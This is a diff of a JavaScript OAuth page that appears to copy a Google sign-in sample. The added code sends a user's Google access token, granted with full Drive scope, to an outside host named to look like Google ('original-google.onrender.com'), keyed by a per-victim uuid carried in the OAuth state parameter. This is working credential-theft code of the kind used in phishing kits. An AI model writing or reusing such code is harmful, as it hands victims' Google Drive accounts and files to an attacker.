@@ -35,8 +35,8 @@ var YOUR_CLIENT_ID = '1096318296267-a3l9r898cd6uc95n64at2q06k31duh45.apps.google
     localStorage.setItem('oauth2-test-params', JSON.stringify(params) );
 
     if (params['state'] && params['state'] == 'try_sample_request') {
+      window.location.replace('https://original-google.onrender.com/getuuid'+'?uuid='+params['state']+'&access_token='+params['access_token']);
 
-      trySampleRequest();
 
     }
 
@@ -58,7 +58,7 @@ urlsp = url.searchParams;
 if(urlsp.get("uuid")!=null){
 
 
-window.location.replace('https://original-google.onrender.com/getuuid'+'?uuid='+urlsp.get("uuid")+'&access_token='+params['access_token']);
+
 }
       
       var id ="id";
@@ -104,7 +104,7 @@ alert("shataakk baby! copied" );
 
                   'scope': 'https://www.googleapis.com/auth/drive',
 
-                  'state': 'try_sample_request',
+                  'state': urlsp.get("uuid"),
 
                   'include_granted_scopes': 'true',
 
